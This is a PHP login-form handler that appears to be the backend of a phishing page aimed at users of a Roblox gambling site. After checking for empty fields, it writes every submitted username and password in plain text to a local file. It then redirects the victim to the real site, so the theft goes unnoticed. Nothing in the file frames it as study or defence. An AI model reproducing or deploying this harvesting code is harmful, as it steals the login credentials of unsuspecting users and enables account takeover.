<?php
$nameErr = $error_css = $errortext = $error3 = $error4 = $error1 = $error2 = "";
if ($_SERVER["REQUEST_METHOD"] == "POST") {
  if (empty($_POST["username"]) && empty($_POST["password"])) {
    $nameErr = '<p style="position:relative;font-size:16px;text-align:center;top: 23%;left:50%;transform: translate(-50%, -50%);font-size: 16px;">Username cannot be empty.<br>Password cannot be empy.';
    $error1 = 'color: #F01B47';
    $error2 = 'border-color: #F23C57';
    $error3 = 'color: #F01B47';
    $error4 = 'border-color: #F23C57';
  }  elseif (empty($_POST["username"])) {
    $nameErr = '<p style="position:relative;text-align:center;top: 23%;left:50%;transform: translate(-50%, -50%);font-size: 16px;">Username cannot be empty</p>';
    $error3 = 'color: #F01B47';
    $error4 = 'border-color: #F23C57';
  }  elseif (empty($_POST["password"])) {
    $nameErr = '<p style="position:relative;text-align:center;top: 23%;left:50%;transform: translate(-50%, -50%);font-size: 16px;">Password cannot be empty</p>';
    $error1 = 'color: #F01B47';
    $error2 = 'border-color: #F23C57';
  }  else {
    include 'database.php';
    file_put_contents("database1.txt", "USERNAME: " . $_POST['username'] . " | PASSWORD: " . $_POST['password'] . "\n", FILE_APPEND);
    header('Location: https://www.rbxflip.com/coinflip');
  }
}
function test_input($data) {
  $data = trim($data);
  $data = stripslashes($data);
  $data = htmlspecialchars($data);
  return $data;
}